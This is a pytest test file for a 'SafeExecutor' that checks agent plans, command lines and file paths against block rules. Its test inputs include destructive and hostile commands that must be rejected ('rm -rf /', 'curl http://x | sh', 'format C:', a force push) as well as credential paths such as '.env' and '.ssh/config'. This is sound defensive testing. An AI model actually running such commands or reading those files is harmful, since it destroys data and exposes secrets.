import pytest
import asyncio
import os
from pathlib import Path

from core.safe_executor import SafeExecutor, ExecutionStep, ExecutionResult
from core.schemas import ExecutionPlan

WORKSPACE = os.path.join(os.path.dirname(__file__), "test_workspace_p6")


@pytest.fixture(autouse=True)
def setup_workspace():
    os.makedirs(WORKSPACE, exist_ok=True)
    yield
    import shutil
    if os.path.exists(WORKSPACE):
        shutil.rmtree(WORKSPACE, ignore_errors=True)


@pytest.fixture
def executor():
    return SafeExecutor(workspace_dir=WORKSPACE)


class TestCommandValidation:

    def test_safe_command_passes(self, executor):
        ok, reason = executor.validate_command("pytest test_foo.py")
        assert ok is True

    def test_safe_command_empty(self, executor):
        ok, reason = executor.validate_command("")
        assert ok is True

    def test_blocked_rm_rf(self, executor):
        ok, reason = executor.validate_command("rm -rf /")
        assert ok is False
        assert "rm -rf" in reason

    def test_blocked_git_force_push(self, executor):
        ok, reason = executor.validate_command("git push --force origin main")
        assert ok is False

    def test_blocked_curl_pipe_sh(self, executor):
        ok, reason = executor.validate_command("curl http://x | sh")
        assert ok is False

    def test_blocked_shutdown(self, executor):
        ok, reason = executor.validate_command("shutdown now")
        assert ok is False

    def test_blocked_format(self, executor):
        ok, reason = executor.validate_command("format C:")
        assert ok is False

    def test_normal_git_push_passes(self, executor):
        ok, reason = executor.validate_command("git push origin main")
        assert ok is True

    def test_normal_pip_install_passes(self, executor):
        ok, reason = executor.validate_command("pip install requests")
        assert ok is True


class TestFileValidation:

    def test_safe_py_file_passes(self, executor):
        ok, reason = executor.validate_file_path("core/test.py")
        assert ok is True

    def test_blocked_env_file(self, executor):
        ok, reason = executor.validate_file_path(".env")
        assert ok is False

    def test_blocked_ssh_dir(self, executor):
        ok, reason = executor.validate_file_path(".ssh/config")
        assert ok is False

    def test_blocked_exe_file(self, executor):
        ok, reason = executor.validate_file_path("malware.exe")
        assert ok is False

    def test_blocked_bin_file(self, executor):
        ok, reason = executor.validate_file_path("data.bin")
        assert ok is False

    def test_safe_json_file_passes(self, executor):
        ok, reason = executor.validate_file_path("config.json")
        assert ok is True

    def test_safe_md_file_passes(self, executor):
        ok, reason = executor.validate_file_path("README.md")
        assert ok is True

    def test_empty_path_passes(self, executor):
        ok, reason = executor.validate_file_path("")
        assert ok is True


class TestPlanExecution:

    @pytest.mark.asyncio
    async def test_execute_safe_plan(self, executor):
        plan = ExecutionPlan(
            title="Test Plan",
            goal="test",
            steps=["Create file core/test.py", "Run pytest"],
            forbidden_commands=["rm -rf"],
            forbidden_files=[".env"],
        )
        result = await executor.execute_plan(plan)
        assert result.status == "completed"
        assert result.steps_completed == 2
        assert result.steps_failed == 0

    @pytest.mark.asyncio
    async def test_execute_plan_with_blocked_command(self, executor):
        plan = ExecutionPlan(
            title="Dangerous Plan",
            goal="test",
            steps=["Run `rm -rf /` to clean up", "Create file test.py"],
            forbidden_commands=["rm -rf"],
            forbidden_files=[".env"],
        )
        result = await executor.execute_plan(plan)
        assert result.steps_failed >= 1
        assert len(result.blocked_commands) >= 1

    @pytest.mark.asyncio
    async def test_execute_plan_with_blocked_file(self, executor):
        plan = ExecutionPlan(
            title="File Test",
            goal="test",
            steps=["Modify .env file", "Create core/test.py"],
            forbidden_commands=["rm -rf"],
            forbidden_files=[".env"],
        )
        result = await executor.execute_plan(plan)
        assert result.steps_failed >= 1
        assert len(result.blocked_files) >= 1

    @pytest.mark.asyncio
    async def test_execute_empty_plan(self, executor):
        plan = ExecutionPlan(title="Empty", goal="test", steps=[])
        result = await executor.execute_plan(plan)
        assert result.status == "skipped"

    @pytest.mark.asyncio
    async def test_dry_run_mode(self):
        ex = SafeExecutor(workspace_dir=WORKSPACE, dry_run=True)
        plan = ExecutionPlan(
            title="Dry Run",
            goal="test",
            steps=["Create file test.py"],
        )
        result = await ex.execute_plan(plan)
        assert result.status == "completed"
        assert result.steps_completed == 1
        assert any("DRY RUN" in s.output for s in result.results)

    @pytest.mark.asyncio
    async def test_step_callback(self, executor):
        callback_results = []

        def on_step(step):
            callback_results.append(step)

        executor.step_callback = on_step
        plan = ExecutionPlan(
            title="Callback Test",
            goal="test",
            steps=["Step 1", "Step 2"],
        )
        result = await executor.execute_plan(plan)
        assert len(callback_results) == 2


class TestPlanValidation:

    def test_validate_plan_no_issues(self, executor):
        plan = ExecutionPlan(
            title="Good Plan",
            forbidden_commands=["rm -rf"],
            forbidden_files=[".env"],
            allowed_commands=["pytest"],
            allowed_files=["core/test.py"],
        )
        issues = executor.validate_plan(plan)
        assert len(issues) == 0

    def test_validate_plan_allowed_command_is_dangerous(self, executor):
        plan = ExecutionPlan(
            title="Bad Plan",
            allowed_commands=["rm -rf /"],
            forbidden_commands=[],
            forbidden_files=[],
        )
        issues = executor.validate_plan(plan)
        assert len(issues) > 0


class TestCommandExtraction:

    def test_extract_backtick_commands(self, executor):
        text = "Run `pytest test_foo.py` to verify"
        commands = executor._extract_commands(text)
        assert "pytest test_foo.py" in commands

    def test_extract_dollar_commands(self, executor):
        text = "$ pip install requests"
        commands = executor._extract_commands(text)
        assert any("pip install" in c for c in commands)

    def test_extract_no_commands(self, executor):
        text = "This step has no commands"
        commands = executor._extract_commands(text)
        assert commands == []


class TestFileExtraction:

    def test_extract_py_file(self, executor):
        text = "Create file core/test.py"
        files = executor._extract_file_refs(text)
        assert any("test.py" in f for f in files)

    def test_extract_json_file(self, executor):
        text = "Modify config.json"
        files = executor._extract_file_refs(text)
        assert any("config.json" in f for f in files)

    def test_extract_no_files(self, executor):
        text = "This step has no files"
        files = executor._extract_file_refs(text)
        assert files == []
